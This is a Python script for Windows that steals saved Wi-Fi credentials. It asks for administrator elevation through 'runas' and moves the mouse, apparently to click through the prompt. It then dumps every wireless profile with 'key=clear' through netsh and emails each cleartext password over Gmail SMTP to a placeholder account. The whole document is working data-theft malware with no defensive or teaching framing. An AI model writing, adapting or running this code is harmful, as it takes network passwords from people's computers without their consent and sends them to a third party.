import ctypes
import sys
import os
import smtplib as s
import time
from pynput.mouse import Button, Controller

mouse = Controller()

req_lines = ""
num = 1

class Server:
    def __init__(self):
        pass
    def start_Server_xlogin_xtransdata(self,msgx1):     
        global server
        server = s.SMTP('smtp.gmail.com',587)
        server.starttls()
        server.login('your_mail@example.com',"password")
        server.sendmail("your_mail@example.com","your_mail@example.com",msgx1)
        server.quit()
            
serverx1 = Server()

def admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
mouse.position=(700,720)
current_time = time.time()

if admin():
    os.system('cmd /c "netsh wlan show profiles>encrypt.txt"')
    file_inf = open("encrypt.txt","r")
    data = file_inf.readlines()
    for x in data:
        if x.startswith("    All User Profile     :"):
            req_lines += x
    file_inf.close()
    req_lines=req_lines.replace("    All User Profile     :","")
    req_lines = req_lines.replace(" ","")
    req_lines = req_lines.replace("\n"," ")
    x = req_lines.split()
    for network in x:
        os.system(f'cmd /c "netsh wlan show profiles {network} key=clear >{num}.txt"')
        num += 1
    for chars in range(1,num):
        file_xread = open(str(chars)+'.txt',"r")
        network_prof = file_xread.read()
        serverx1.start_Server_xlogin_xtransdata(network_prof)
        chars+=1
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)